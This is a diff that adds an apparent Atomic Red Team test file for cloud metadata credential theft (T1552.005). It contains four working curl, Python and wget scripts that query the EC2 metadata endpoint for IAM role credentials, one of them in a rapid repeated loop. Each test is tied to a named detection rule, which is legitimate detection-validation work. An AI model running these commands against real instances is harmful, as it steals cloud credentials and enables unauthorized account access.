@@ -1,0 +1,257 @@
+attack_technique: T1552.005
+display_name: "Unsecured Credentials: Cloud Instance Metadata API"
+atomic_tests:
+  - name: EC2 IMDS Credential Theft via curl
+    auto_generated_guid: ec2a1b3c-4d5e-6f7a-8b9c-0d1e2f3a4b5c
+    description: |
+      Simulates an attacker stealing EC2 instance credentials by accessing the Instance Metadata Service (IMDS) using curl.
+      This test retrieves the IAM role name and then fetches temporary credentials including AccessKeyId, SecretAccessKey, and Token.
+      
+      This technique is commonly used after achieving code execution on an EC2 instance through vulnerabilities like SSRF, RCE, or compromised applications.
+      The stolen credentials can then be used to pivot to AWS services and perform reconnaissance or privilege escalation.
+      
+      Detection: Should trigger "Suspicious Process Accessing EC2 Instance Metadata Service" rule.
+    supported_platforms:
+      - linux
+      - macos
+    input_arguments:
+      imds_endpoint:
+        description: EC2 Instance Metadata Service endpoint
+        type: url
+        default: http://169.254.169.254
+      metadata_version:
+        description: IMDS version to use (latest for IMDSv1)
+        type: string
+        default: latest
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        echo "[*] Attempting to access EC2 Instance Metadata Service..."
+        
+        # Check if IMDS is accessible
+        if curl -s -m 2 #{imds_endpoint}/#{metadata_version}/meta-data/ > /dev/null 2>&1; then
+          echo "[+] IMDS is accessible"
+          
+          # Retrieve IAM role name
+          ROLE_NAME=$(curl -s #{imds_endpoint}/#{metadata_version}/meta-data/iam/security-credentials/)
+          echo "[+] IAM Role Name: $ROLE_NAME"
+          
+          # Retrieve temporary credentials
+          if [ ! -z "$ROLE_NAME" ]; then
+            echo "[*] Retrieving temporary credentials..."
+            CREDENTIALS=$(curl -s #{imds_endpoint}/#{metadata_version}/meta-data/iam/security-credentials/$ROLE_NAME)
+            
+            # Extract credential components (for demonstration only - do not log in production)
+            ACCESS_KEY=$(echo $CREDENTIALS | grep -o '"AccessKeyId" : "[^"]*' | cut -d'"' -f4)
+            SECRET_KEY=$(echo $CREDENTIALS | grep -o '"SecretAccessKey" : "[^"]*' | cut -d'"' -f4)
+            TOKEN=$(echo $CREDENTIALS | grep -o '"Token" : "[^"]*' | cut -d'"' -f4)
+            
+            if [ ! -z "$ACCESS_KEY" ]; then
+              echo "[+] Successfully retrieved credentials"
+              echo "[+] AccessKeyId: ${ACCESS_KEY:0:20}..."
+              echo "[!] Credentials stolen - this would allow AWS API access"
+            else
+              echo "[-] Failed to extract credentials"
+            fi
+          else
+            echo "[-] No IAM role attached to this instance"
+          fi
+        else
+          echo "[-] IMDS is not accessible (may be disabled or not running on EC2)"
+        fi
+      cleanup_command: |
+        # No cleanup needed - read-only operation
+        echo "[*] No cleanup required for read-only IMDS access"
+
+  - name: EC2 IMDS Credential Theft via Python
+    auto_generated_guid: f1a2b3c4-d5e6-7f8a-9b0c-1d2e3f4a5b6c
+    description: |
+      Simulates credential theft from EC2 IMDS using Python requests library.
+      This represents a more sophisticated attack where an attacker uses scripting to automate credential harvesting.
+      
+      Python-based attacks are common in web application exploitation scenarios where the attacker has achieved
+      code execution through vulnerabilities like command injection, deserialization, or file upload bypasses.
+      
+      Detection: Should trigger "Suspicious Process Accessing EC2 Instance Metadata Service" rule.
+    supported_platforms:
+      - linux
+      - macos
+    dependencies:
+      - description: Python3 must be installed
+        prereq_command: |
+          which python3
+        get_prereq_command: |
+          echo "Please install Python3 manually for your platform"
+    dependency_executor_name: bash
+    input_arguments:
+      imds_endpoint:
+        description: EC2 Instance Metadata Service endpoint
+        type: url
+        default: http://169.254.169.254
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        python3 << 'EOF'
+        import sys
+        try:
+            import requests
+        except ImportError:
+            print("[-] requests library not available, using urllib instead")
+            import urllib.request
+            import json
+            
+            imds_url = "#{imds_endpoint}/latest/meta-data/iam/security-credentials/"
+            
+            try:
+                # Get role name
+                response = urllib.request.urlopen(imds_url, timeout=2)
+                role_name = response.read().decode('utf-8').strip()
+                print(f"[+] IAM Role Name: {role_name}")
+                
+                # Get credentials
+                creds_url = f"{imds_url}{role_name}"
+                response = urllib.request.urlopen(creds_url, timeout=2)
+                creds = json.loads(response.read().decode('utf-8'))
+                
+                print(f"[+] AccessKeyId: {creds.get('AccessKeyId', 'N/A')[:20]}...")
+                print(f"[+] SecretAccessKey: {creds.get('SecretAccessKey', 'N/A')[:20]}...")
+                print(f"[+] Token: {creds.get('Token', 'N/A')[:50]}...")
+                print("[!] Credentials stolen successfully")
+            except Exception as e:
+                print(f"[-] IMDS not accessible: {e}")
+            sys.exit(0)
+        
+        # Using requests library
+        imds_url = "#{imds_endpoint}/latest/meta-data/iam/security-credentials/"
+        
+        try:
+            # Get role name
+            response = requests.get(imds_url, timeout=2)
+            role_name = response.text.strip()
+            print(f"[+] IAM Role Name: {role_name}")
+            
+            # Get credentials
+            creds_url = f"{imds_url}{role_name}"
+            response = requests.get(creds_url, timeout=2)
+            creds = response.json()
+            
+            print(f"[+] AccessKeyId: {creds.get('AccessKeyId', 'N/A')[:20]}...")
+            print(f"[+] SecretAccessKey: {creds.get('SecretAccessKey', 'N/A')[:20]}...")
+            print(f"[+] Token: {creds.get('Token', 'N/A')[:50]}...")
+            print("[!] Credentials stolen successfully")
+        except Exception as e:
+            print(f"[-] IMDS not accessible: {e}")
+        EOF
+      cleanup_command: |
+        # No cleanup needed - read-only operation
+        echo "[*] No cleanup required"
+
+  - name: High-Frequency IMDS Credential Harvesting
+    auto_generated_guid: a1b2c3d4-e5f6-7890-abcd-ef1234567890
+    description: |
+      Simulates rapid, repeated access to the EC2 Instance Metadata Service to harvest credentials multiple times.
+      This pattern mimics automated exploitation tools or scripts that repeatedly query IMDS to ensure credential retrieval.
+      
+      Attackers may use this technique to:
+      - Ensure credentials are successfully retrieved
+      - Harvest credentials before they expire
+      - Test for IMDS availability during exploitation
+      
+      Detection: Should trigger "High-Frequency IMDS Access from Single Process" rule (5+ connections in 5 minutes).
+    supported_platforms:
+      - linux
+      - macos
+    input_arguments:
+      imds_endpoint:
+        description: EC2 Instance Metadata Service endpoint
+        type: url
+        default: http://169.254.169.254
+      query_count:
+        description: Number of times to query IMDS
+        type: integer
+        default: 6
+      delay_seconds:
+        description: Delay between queries in seconds
+        type: integer
+        default: 2
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        echo "[*] Starting high-frequency IMDS credential harvesting..."
+        echo "[*] Will query IMDS #{query_count} times with #{delay_seconds}s delay"
+        
+        for i in $(seq 1 #{query_count}); do
+          echo "[*] Query $i/#{query_count}"
+          
+          # Query IMDS for role name
+          ROLE_NAME=$(curl -s -m 2 #{imds_endpoint}/latest/meta-data/iam/security-credentials/ 2>/dev/null)
+          
+          if [ ! -z "$ROLE_NAME" ]; then
+            # Query for credentials
+            curl -s -m 2 #{imds_endpoint}/latest/meta-data/iam/security-credentials/$ROLE_NAME > /dev/null 2>&1
+            echo "[+] Query $i completed successfully"
+          else
+            echo "[-] Query $i failed - IMDS not accessible"
+          fi
+          
+          # Delay before next query (except for last iteration)
+          if [ $i -lt #{query_count} ]; then
+            sleep #{delay_seconds}
+          fi
+        done
+        
+        echo "[!] High-frequency harvesting complete - should trigger detection"
+      cleanup_command: |
+        echo "[*] No cleanup required for read-only operations"
+
+  - name: EC2 IMDS Access via wget
+    auto_generated_guid: b2c3d4e5-f6a7-8901-bcde-f2345678901a
+    description: |
+      Simulates credential theft using wget instead of curl. Attackers may use different tools based on what's
+      available on the compromised system. This test validates detection coverage for alternative HTTP clients.
+      
+      Detection: Should trigger "Suspicious Process Accessing EC2 Instance Metadata Service" rule.
+    supported_platforms:
+      - linux
+      - macos
+    dependencies:
+      - description: wget must be installed
+        prereq_command: |
+          which wget
+        get_prereq_command: |
+          echo "Please install wget manually for your platform"
+    dependency_executor_name: bash
+    input_arguments:
+      imds_endpoint:
+        description: EC2 Instance Metadata Service endpoint
+        type: url
+        default: http://169.254.169.254
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        echo "[*] Attempting IMDS access using wget..."
+        
+        # Get role name
+        ROLE_NAME=$(wget -qO- --timeout=2 #{imds_endpoint}/latest/meta-data/iam/security-credentials/ 2>/dev/null)
+        
+        if [ ! -z "$ROLE_NAME" ]; then
+          echo "[+] IAM Role Name: $ROLE_NAME"
+          
+          # Get credentials
+          CREDENTIALS=$(wget -qO- --timeout=2 #{imds_endpoint}/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null)
+          
+          if [ ! -z "$CREDENTIALS" ]; then
+            echo "[+] Successfully retrieved credentials using wget"
+            ACCESS_KEY=$(echo $CREDENTIALS | grep -o '"AccessKeyId" : "[^"]*' | cut -d'"' -f4)
+            echo "[+] AccessKeyId: ${ACCESS_KEY:0:20}..."
+            echo "[!] Credentials stolen via wget"
+          fi
+        else
+          echo "[-] IMDS not accessible"
+        fi
+      cleanup_command: |
+        echo "[*] No cleanup required"
